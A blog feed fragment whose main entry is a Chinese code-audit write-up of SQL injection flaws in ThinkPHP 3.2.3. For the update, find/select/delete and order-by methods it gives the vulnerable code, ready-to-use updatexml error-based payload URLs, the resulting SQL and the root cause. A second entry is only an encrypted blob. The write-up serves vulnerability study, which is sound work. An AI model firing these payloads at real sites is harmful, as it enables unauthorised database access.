      <category term="Notes" scheme="http://h3art3ars.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>think3.2.3 sql注入</title>
    <link href="http://h3art3ars.github.io/2019/12/23/think3-2-3-sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://h3art3ars.github.io/2019/12/23/think3-2-3-sql%E6%B3%A8%E5%85%A5/</id>
    <published>2019-12-23T04:16:44.000Z</published>
    <updated>2019-12-23T04:21:41.980Z</updated>
    
    <content type="html"><![CDATA[<h2 id="update注入-lt-3-2-3"><a href="#update注入-lt-3-2-3" class="headerlink" title="update注入(&lt;=3.2.3)"></a>update注入(&lt;=3.2.3)</h2><h3 id="漏洞代码实例"><a href="#漏洞代码实例" class="headerlink" title="漏洞代码实例"></a>漏洞代码实例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$User&#x3D;M(&#39;user&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$user[&#39;id&#39;]&#x3D;I(&#39;id&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$data[&#39;name&#39;]&#x3D;I(&#39;name&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$data[&#39;money&#39;]&#x3D;I(&#39;money&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">$res&#x3D;$User-&gt;where($user)-&gt;save($data);</span></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?id[]&#x3D;bind&amp;id[1]&#x3D;1%20and%20%20updatexml(1,concat(0x5b,(select%20user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;UPDATE &#96;user&#96; SET &#96;money&#96;&#x3D;&#39;0&#39;,&#96;user&#96;&#x3D;&#39;&#39; WHERE &#96;id&#96; &#x3D; &#39;&#39; and updatexml(1,concat(0x5b,(select user()),0x5d),1)</span></pre></td></tr></table></figure><h3 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">save($data,$options)-&gt;_parseOptions($Options)-&gt;update($data,$options)-&gt;parsewhere($option[$where])-&gt;parsewhereitem($key,$value)</span></pre></td></tr></table></figure><ul><li><p>$Options参数为空，但经过_parseOptions($Options)方法将参数中的id[]数组变为$where</p></li><li><p>进入parsewhereitem()方法将id分为键值 如果id[0]==bind，则将id[1]拼接到</p></li><li><p>如果id[0]==bind，则将id[1]拼接到 <code>$whereStr .= $key.&#39; = :&#39;.$val[1];</code></p></li><li><p><code>:n</code>表示更新的数组 <code>data[n]</code>,可以结合sql语句闭合一下，有时不闭合也可以造成注入</p></li><li><p>前面的exp变为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?id[]&#x3D;bind&amp;id[1]&#x3D;1%20and%20%20updatexml(1,concat(0x5b,(select%20user()),0x5d),1)&amp;user&#x3D;admin&amp;money&#x3D;11</span></pre></td></tr></table></figure><p>则语句则变成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">UPDATE &#96;user&#96; SET &#96;money&#96;&#x3D;11,&#96;user&#96;&#x3D;&#39;admin&#39; WHERE &#96;id&#96; &#x3D; 11 and updatexml(1,concat(0x5b,(select user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;id&#x3D;:1 and updat.... </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;而 :1&#x3D;data[1]&#x3D;money&#x3D;11</span></pre></td></tr></table></figure></li></ul><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>经过<code>_parseOptions($Options)</code>方法将可控变量合并到<code>$Options</code>参数中</p><h2 id="find-select-delete注入-lt-3-2-3"><a href="#find-select-delete注入-lt-3-2-3" class="headerlink" title="find_select_delete注入(&lt;=3.2.3)"></a>find_select_delete注入(&lt;=3.2.3)</h2><h3 id="漏洞代码实例-1"><a href="#漏洞代码实例-1" class="headerlink" title="漏洞代码实例"></a>漏洞代码实例</h3><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">  $res&#x3D;M(&#39;user&#39;)-&gt;find(I(&#39;id&#39;));      &#x2F;&#x2F;select * from user where id &#x3D;1;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">  $res&#x3D;M(&#39;user&#39;)-&gt;select(I(&#39;id&#39;));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$res&#x3D;M(&#39;user&#39;)-&gt;delete(I(&#39;id&#39;));</span></pre></td></tr></table></figure></li></ul><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">  delete 方法 第一个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">  select 方法 第一个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  find 方法 第一个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">  Add 方法 第二个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  addAll 方法 第二个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">save 方法 第二个参数可外部控制时可注入</span></pre></td></tr></table></figure></li></ul><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?id[where]&#x3D;1 and updatexml(1,concat(0x7b,(select user()),0x7d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;[find&#x2F;select]select * from user where id&#x3D;1 and updatexml(1,concat(0x7b,(select user()),0x7d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">?id[table]&#x3D;user%20where%20id&#x3D;updatexml(1,concat(0x5b,(select%20user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;[find&#x2F;select]select * from user where id &#x3D;updatexml(1,concat(0x5b,(select%20user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">?id[where]&#x3D;id%3d3%20and%20updatexml(1,concat(0x5b,(select%20user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;[delete]DELETE FROM &#96;tp_member&#96; WHERE id&#x3D;3 and updatexml(1,concat(0x5b,(select user()),0x5d),1)</span></pre></td></tr></table></figure><p>除了where 还可以利用其他方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">where,table,field,join,group,having....</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;根据parseSql函数动态调试</span></pre></td></tr></table></figure><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p><code>_parseOptions()</code>方法执行了数组合并操作，将可控 <code>options</code>参数拼接到即将执行的sql语句参数中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if(is_array($options))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    $options &#x3D;  array_merge($this-&gt;options,$options);</span></pre></td></tr></table></figure><h3 id="漏洞流程（find）"><a href="#漏洞流程（find）" class="headerlink" title="漏洞流程（find）"></a>漏洞流程（find）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">find($options&#x3D;array())-&gt;select($options&#x3D;array())-&gt;buildSelectSql($options)-&gt;parseSql($sql,$options&#x3D;array());</span></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;parseSql()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;$sql&#x3D;SELECT%DISTINCT% %FIELD% FROM &#x2F;&#x2F;%TABLE%%FORCE%%JOIN%%WHERE%%GROUP%%HAVING%%ORDER%%LIMIT% %UNION%%LOCK%%COMMENT%</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">public function parseSql($sql,$options&#x3D;array())&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">        $sql   &#x3D; str_replace(          array(&#39;%TABLE%&#39;,&#39;%DISTINCT%&#39;,&#39;%FIELD%&#39;,&#39;%JOIN%&#39;,&#39;%WHERE%&#39;,&#39;%GROUP%&#39;,&#39;%HAVING%&#39;,&#39;%ORDER%&#39;,&#39;%LIMIT%&#39;,&#39;%UNION%&#39;,&#39;%LOCK%&#39;,&#39;%COMMENT%&#39;,&#39;%FORCE%&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">            array(</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseTable($options[&#39;table&#39;]),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseDistinct(isset($options[&#39;distinct&#39;])?$options[&#39;distinct&#39;]:false),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseField(!empty($options[&#39;field&#39;])?$options[&#39;field&#39;]:&#39;*&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseJoin(!empty($options[&#39;join&#39;])?$options[&#39;join&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseWhere(!empty($options[&#39;where&#39;])?$options[&#39;where&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseGroup(!empty($options[&#39;group&#39;])?$options[&#39;group&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseHaving(!empty($options[&#39;having&#39;])?$options[&#39;having&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseOrder(!empty($options[&#39;order&#39;])?$options[&#39;order&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseLimit(!empty($options[&#39;limit&#39;])?$options[&#39;limit&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseUnion(!empty($options[&#39;union&#39;])?$options[&#39;union&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseLock(isset($options[&#39;lock&#39;])?$options[&#39;lock&#39;]:false),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseComment(!empty($options[&#39;comment&#39;])?$options[&#39;comment&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseForce(!empty($options[&#39;force&#39;])?$options[&#39;force&#39;]:&#39;&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">            ),$sql);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">        return $sql;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure><p>将可控的options[‘where’]参数拼接到sql语句中</p><p>也可以使用其他的options值拼接，例如options[‘table’]</p><p><a href="https://xz.aliyun.com/t/2631" target="_blank" rel="noopener"> thinkphp3.2_find_select_delete注入 </a></p><h2 id="ord-by-注入-lt-3-2-3-amp-lt-5-1-22"><a href="#ord-by-注入-lt-3-2-3-amp-lt-5-1-22" class="headerlink" title="ord by 注入(&lt;=3.2.3&amp;&lt;=5.1.22)"></a>ord by 注入(&lt;=3.2.3&amp;&lt;=5.1.22)</h2><h3 id="漏洞代码实例-2"><a href="#漏洞代码实例-2" class="headerlink" title="漏洞代码实例"></a>漏洞代码实例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$data&#x3D;array();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$data[&#39;user&#39;]&#x3D;array(&#39;eq&#39;,&#39;admin&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$order&#x3D;I(&#39;get.order&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$res&#x3D;M(&#39;user&#39;)-&gt;where($data)-&gt;order($order)-&gt;find();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">ar_dump($res);</span></pre></td></tr></table></figure><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?order[updatexml(1,concat(0x3a,(select%20user()),0x5d),1)%23]&#x3D;1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;直接用order&#x3D;updatexml(1,concat(0x3a,(select%20user()),0x5d),1)%23也行 亲测</span></pre></td></tr></table></figure><p>执行的sql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">SELECT * FROM &#96;user&#96; WHERE &#96;user&#96; &#x3D; &#39;admin&#39; ORDER BY updatexml(1,concat(0x3a,(select user()),0x5d),1)# 1 LIMIT 1</span></pre></td></tr></table></figure><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p> ThinkPHP在处理order by排序时，当排序参数可控且为关联数组(key-value)时，由于框架未对数组中key值作安全过滤处理，攻击者可利用key构造SQL语句进行注入。</p>]]></content>
    
    <summary type="html">
    
      think系列之 thinkphp3.2.3 sql注入漏洞总结
    
    </summary>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="thinkphp" scheme="http://h3art3ars.github.io/tags/thinkphp/"/>
    
      <category term="代码审计" scheme="http://h3art3ars.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="sql注入" scheme="http://h3art3ars.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>2019/11 Person Notes</title>
    <link href="http://h3art3ars.github.io/2019/12/17/2019-11-Person-Notes/"/>
    <id>http://h3art3ars.github.io/2019/12/17/2019-11-Person-Notes/</id>
    <published>2019-12-17T02:43:59.000Z</published>
    <updated>2019-12-17T02:45:20.657Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">没什么好看的垃圾个人笔记</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="d59de06ad25b9edcaa18ec538ddf3fe2215c839654af56f34deec268dbacfe0c">0a6b6a6dd17bc5a243a9fba39bb846422b617f2ce4756723dba336c6ac45db89e21edb41fc8bd7947c33434f635bea09e44d1cf875eebc9c7a2b4237c686565f3b5c5d2c247b7c6e93699a766e585adc480a6f656aef2ba4ccf77ca515a84accfae495bb8f9865d438dfc77a85c69c14160a13cae8bfd31fff510abc015141046412c80bf866414d3f49ad497175565bc3294408e581a8a02ca6fd531a30730b8e56d7d079bc69f5054ac0279d31cbbab1e82a97752aa4bfc4c75f26ca85d45005e79e9bb233e93cde64e5c4005ace908b6765d4f39fe4c7dc35c150e5b07b2f92ca672406c75e8679924d33b04dba22183002e7d85e642435690ed3308ae79774b25a5bc6f3ddfbe0aa43f3d1c615c38576a1407767bc0f5d83588268b8ddbdfcbcd699d1f06e407ac45f2c115142e01bbb50a055548774822806f4ef6fffa094b42403de3a944b666c71cb7e3f7787ed38a0531fb4ec5a8cd775e9fe56f6f938eb1eddf9b996b930f4a090ea8c7d0e6dd8ad933079127ab5bf633ad81a3b6d221fe262eef887b8192a22095cc20c0bbe4389bc19acffbb4bf580ed1c46ecb03a3b5f518752ab8c489b053e0b3ec9895663b5c1829165f483e814c07a546f64412e0d9b21f3ee2d5eb1b0d4fad2c872f888770d5ba49c1771432a5c74e34ac3336bf5d3ed70d934ac93bf2f226a49fd7aebb99b6c51a82723b3ccda6710915116ea492cc2d5d401811d033c172575b4ebb2a5dacde184718f2b9c0bc124a9310832c9b4dcf27128100bddee85165e0e43a6e48c089e0907b1c0a0b322cc4c0f966d690cb3ab5017043ead7597a5ae413cc1d0e8d63a0d986b104ab3b0e481f5ab91f4f35fc1d9f47c8d1d3db4acbdba70c561ff314e28bccfec9685e3b81c54535f0ac989092b7460895f6c1c8ec78e2b621490a4eb8bcd234b331d7b0dfd67153a78469302557955f72bbdbd359749311f4369756511296488308c61f3b31518cce23c3ad6e5f32ffb200226b1077047ca4314ba1fe24ddfcd3c66c0a01bedc930854052afdecefe1961fb719d43bc450b01f032d6f925ef0e87c3cc999644eeee94d7d5e2a68fda2537b10ec8c76d916aa825ca172acfa87c37802df21c73bf270ad74d590efddfbf1b91b4f8c17232aec10a57033ee964650c6446499797af9d9e88a19da2bddb6f149099148d61b4ada7efc5027b0f3764e15d06975050c6306f8cca478750e46e460c2a641736f9e429efa455a36924229573410e1902dc1a38472ef44b8f91378c74b623f0464a5222e873eba89054098b1847c431ac84767d1ea56b1f994c64271f4c8ca3253bfdbb319956c4b6d74f7e6de768b011ed74f8e396a06c723e5d82fbb45e20f675fba9d9511ac3a242bcdf64ce5fbdd2ae6adeca9d1e74b1a1af1c07e9e84d9302ce3287c0574fd896f264f76e8c19a252b47f137a3982d65dcb83b81f76b3756cc6e6f312754b36e3fb6e45d5ac028e30c8d3caeaccd7203c842624eb33d7c169762e00cb87935510ea461a1123fb944cb876cb7be96767090391847254f4de7f3cce0a6a765bb3244610573020f86ad621690d8cc53a54c7b3acbd15589c46f96acc18adf1fe1b55195efd73dd8a5cbce8de55078944ce0b941170b607d6286d46da3e6629c7c2074630260edd78ed89b37df95527bc2909039e4b2aebb4233be0ca3455436c453a12d343f2de5ebea2485ac2b198cce674e445ca2af24987216a7aef591bf1d7ffd8d3f571cc2b09002481837e1bfff5b2f5c943a41a6473938777eea5175ce41936bc9fa2635710a56583b5f4eaf872bc8af162592d82e4d73742b83ffc3280ba21480ec52e576dc0ba4decdfa985eceb0ee999c46976a41e106b9d49d60bb192dbd14cde83537a643ef55f4e8e453d918d9b207571e93a9c7ec13bec308dabf0e21ac9fd11838f7209861d1efffb53378eedbe6faf926139b627d804cf5ffdc1c81e094ac92bac972fa57c903fbd918d8e9e9b3cd31eedadec7e9177a91b5d4591151be09ad4ce3c673ef72168ebbb3197eb27eee0d6a1a7965d481a48ae9dbcc85b05ec11f98849c8ba99ef0d0eec3dd7992c88998d020b0d60ac8a21903bf1a4036a73f20aebe41c97ccac5b8536d68bfdd38985cfeebc080f35e97d8b150f7d9ad20d9e4425ea00f3e8bf92a18f3812cba3cf6fddc690903bf657b73aa246f291e53d301f892f49444d3f06fcc30578bdde7bbe27acd226ca6c8a0236512dde9abd1a94b06e17e5d162cf3e26645ca1fa65386f8eb5432fec042bfcb594b15226029f408247f64b147884d7d842ab9502ed9d20b57c021e9eabead7b18f70df239ca9f713c95d031caff12df2b9c448801efd2ccc049112de535536eedeaeb599b42316b3aaf7e644c271a31608c5347dcf4472a52f927d88e67760b686bb79dcf5254271f50f89b0863898f21ed30357c192f5eb9604046c0f5c18ca6b7280bced5c7f0a2b45a0b8324e059d6b43481c9aa98fb07ea8920590e4e08029be6a9a92bccd9f9423fa204b409a52481ba1c23d9fdd8912547ced8ab20e2078f2a15f107546b5e418546e618770f64a200e35099a80af4e58c3d1eafc88a3cd3a91457efb1ef9c347e8d62e5c9e5a71630162f7f802424e35361aca8ec371ca7cb02f9198326db4e82ca3f999ba26986457920d0a9269861e39299628891582334aa935a85b82a4a6b7b1268d626db8aee2135a1323c93fc1f75bf2874751e4daef36710e5efb27075e2e60401890e8469c215e812115bb4f52bd592d9ba6bc8039fef0507f100b1d18517603a2af9e19853fa6b420a939b022f6cbed40c014d358b909eebba9741c40961bc4a170ebf6590345c8d326bb663336681bade69b9af7f128e22332950021b7d06b17ffae594a77160ba3906c16d852ff15649cda339793a2a608b5b48c37e74ee180236a16357343b7157b2de94dcdd7bd4226c9c2f192856cf3d193443881da31fd73a93e17aa37876495aa0273454c3b2d17f95060bd2050b709dd00d321c97f8a1a99b2c02ac99b776bd1a1f9816d17060a5b118c9e489e4bf05749131902cb7da5ffefd9c5ae502c6a75704492a09d3d0152671df221c2b8221eda891b1d85bc460cfd24655f7e55d6ee68e0c6925ba0ecf42dcffcd28e732fcd3349b61d0c3602ec3c5694b7f2e270fc4bfb8f5971f555b6a98c79a0d6f3eef19a7d56d2bfc805d85e93e2e4cc4c28653e157ab714156b02a6630aab5b3938d2da56918a4fa5219381c74a32d3c6250a4a73279b0e847d93ec87e2463bec082e4598886f0a529c04fe30c442013ca22c4825c0ec8f8e7528727ef99f1b7eaebd3fcf88ef480f8913ecce43d2054dc7372ec49d53a6af4ad1c227c96979ab5aa9615d959f42bd9dec4e5ffe73c37368ba80aec28c4ed7aa59c118d631537fb6edacf7e5f99c2e79658fcdddaf4e63e56b24195f56edd813cc6bd1a077a739bd5f5ae643418e536d36763f4cbc8b5af9ad06cec95f981a09e2a5529fa7b4bdbf3d015aefb54bfa5bcee072470ce093ad164618d18b0b5b2969a810cbd0a26483d7e8c6fb75c49856e726d710c7de224fd22c2431515387b9a1861faa74fa0fc8eb1218ae3223982d3443eaaf7a985535280b53b1b7e1c2a8feb2c9761e518aa7c4e5f8b264a1b561b93144fa0ade5b42301f1ee995482a48df3b2c664090e926e4204d6c7c2d1e7f22c805a4142806bd3b204ea284a4584df40a6e850dc403b71cab189b92907f3c8522244520171b4e4cfb93e31d36aff0826775585fd341ba8892a1b7bfe93b002b033c9ae8a0fb61d212a2be62256855aad95a8cd7dd5b5a431e8c4df46acf16d2c21edc5af84c746a785a816f72ed6737c24e157b2111384472668cf9060c4cbed36e9668d42dd0bfbe0e48066e69e4f2fd4cbaa9e77ff34dceaaa845ebb02db89238fd02958f0847270ad201176d46c106e8e937fb0ac963cf8afebb03b710f5802fba9192dae02960615e62c6f3154d53610f1b099a5ee96b0562bbac1d0621361138be9b869bc1443eda9655bece224c630988a1636ad5b0b8639e09e37fabbfbc231c102685e0c1268339a78b8e42164c83643cee90334dafaadbb207f2c725ae8755c0bc041ac188e9b9d5e803994449bfb05d68ed877c153f40030b883471c35e17fca7509dbb09c3a547609b3523ffe432452e930ba23b60bdb429a7940fe3822f4cb94604bf28eaadb03f34bd3f979a0671f5dc6999fa42e94e9b9e674ebccf2062973fe68206bf4bdddf7bdad42d80a6b9f214dbab2c8e3465ef46abffac20f0aa3e21df53d28e6e14c0f0c8836188703d1407e895a69835828a0288cd207a420ed5cf722557e36014e1489fe85b1276f003ac918924e671a5ec46b649775f8308740cca4718a0b1ba0cc3431e79c99dc30e393eef907a89e0402bb5f0d1a7f791943036a21e2b81495b35285b7b1416342923e4b19c8f469a6b155b603f7acbc25ed1e7a5663b4ea34ccc125710c7334a75500c8d2c94e6b80bfc5d5e3011fc94722c5fd72fcad071155e8c2a540bad42621fe6cf1bac1272889cff0f67a1477aa7b35c67502abadfd573ab0fda38305bb61c64cf481bd111065ba84e59171fa0f5dd9ca41b6a377dd207925d093a018fd9a5f4be32e9d086300d9628810d0f244b72ef445609db5a530edccd08340d85952d8e856c7380eb37e9a1762f4452a8d442f24ce4f1e269e792c91bdf5087ab760722d8736a05a6e6f2920b76d73db2c7d171924903a6bfceb2897aea54515688c5d03d73717f6aecc420673acd291db960ab554c97020fd27cb9ea7c72f6c15cefd2f78e90984bdcc82af571fef64f85ddc96507747e6d17211723e84f0cb662bd7001ebe9fe297c35b62fe936da84f51b1e4433b7ab01e270e0dd9c5efc733103c78153292a30fbdba09e6310b98bd6cfd6f7b48d648befafc04a64cfba61f294f38bbf37e3f7448e9464536c277c226926e63c2deefdb6e86c60819fb259a3b5065d6e66fec8ccc1492e8276446e87493f7c6725b745555d9c5660d25a3fee670fc38e1b3473b6763ec50fe6796285569242f0e649dbfa8e49d4e65ae122f926a4f8d6c95d7fa8fbb17dfbf0ae93360361e2de4929274132e607d5938cde0d9eca12bfce30ecf69ad87a5b453b12de8394351c7405b0a99f5c09155e7624b41353b9ffe8385050f1b03af94be93ec0a98796e3d20fbac17c4e87b5c7d624481c84407297f7ab259f0b04b7c5b92c84b22204e7e8b501d42f2fa6b9fe07cd948f347e4c0b497d5b47db45e485dd7f8f8477801742aed2a0385e978807b6e4bd78a4f43167e7708896212ddc94cb32e6874c70c8cd6982988467363d1ae31856bdfbf1499f558280f7b64029af606a4b9ad39ef7dbccf55ae44e3078fa5c79d16ea19b4d4fe9f1232e7e245094c73a2de8a19302f3d11599a528e38ea4ce6683375f8e326bee59b0e03d25165a4ce27cbc7c3c49bfe6bff337d22a05072b6de4484d127886493c9415b62c0807457ce79ed68a1b25dbea39061bbc9b6ac3ef5986b74ccf781539822f7cd81e8a5cfb9d13c19ba51c6c95422fba732110c6b94765960d5e71bd9e6f784ca79923084cdd484e6834a70aab198fc4591f0ab0f3e0074a0da08af4efcc37ed63a4040e4ce2409980c137bb0fdd2680cf8b90efa1d81c956a1d6cfb8bdb195dce11b96df3a5caba6cdf6ea8365cee7a99f8df3bf2b46eee9a411c77ffc264eda7f6e12e1a55fd2d8ac2667b6082f4e3351e4c9bb11af4bc1f77d629bcfd52965c768007704e0d4cf6d2f663c8dbd5c38260ce48acafc9347f7243cf776fa870be2c19948d8ea2aea5c0c9c2479be83277805d3bb093c7031ebe9a585a66d35259e630c62f91e53f1dc304a8bb8c529c6a3407038d8221a06e4b375c7465ac594aeac4447d2b6a75b4af0552bc1ee80f46b3a6d1dc9cf97d0226477c9733d109e4e5868e758e2a6d3b334872d2634287355dda314c2a8875876dbca7612c4f70e73e2082a78e8f4d6b083f4f43e1026ad476ba3beeaaf6abdae94d3ee63a9b7ed4a491d5807392c1c7e9fc0f45b07d0d5429b17efa2934f4e43f948baa85271d4ca4dedd9a7f19af947a40ccb748ff1de57c14781d51a435d621646bdd25c3396522e0e95be62a6529bfc851622564eaf5393fadbef1c5801b813bebe7df6cf675b3ff747589ab2c5d5aac2d91efaa71bf5e7f73d9bb7ad78af64ff15375a57cb76468d1ee1674892d532401a5e8511167744fcb3ce6f6e2e3e87f447110d4b6687c3a1b47162a308474f7abb5190edd66dac77944aef776c180a9b7ce53710244f2569c1b16eebc684d37909e602e0d9c67d